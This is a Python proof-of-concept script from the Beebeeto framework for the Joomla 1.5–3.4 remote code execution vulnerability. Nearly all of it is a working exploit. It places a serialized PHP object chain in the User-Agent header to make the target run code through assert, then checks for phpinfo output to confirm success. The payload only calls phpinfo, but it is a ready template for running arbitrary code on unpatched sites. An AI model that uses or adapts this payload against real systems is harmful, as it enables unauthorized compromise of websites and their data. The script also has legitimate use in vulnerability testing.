#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2 
import cookielib,sys

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0152',
            'name': 'Joomla! 1.5-3.4 远程代码执行漏洞 PoC',
            'author': 'Zer0_0ne',
            'create_date': '2015-12-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer3_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Joomla',
            'vul_version': ['1.5-3.4'],
            'type': 'Code Execution',
            'tag': ['Joomla漏洞', '远程代码执行漏洞', '序列化', 'Session', 'php'],
            'desc': 'Joomla! 1.5-3.4 代码执行漏洞',
            'references': ['https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        cj = cookielib.CookieJar() 
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) 
        urllib2.install_opener(opener) 
        urllib2.socket.setdefaulttimeout(10) 

        ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86' 

        req  = urllib2.Request(url=verify_url,headers={'User-Agent':ua}) 
        opener.open(req) 
        req  = urllib2.Request(url=verify_url) 
        if 'SERVER["REMOTE_ADDR"]' in opener.open(req).read(): 
            args['success'] = True
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint
    mp = MyPoc()
    pprint(mp.run())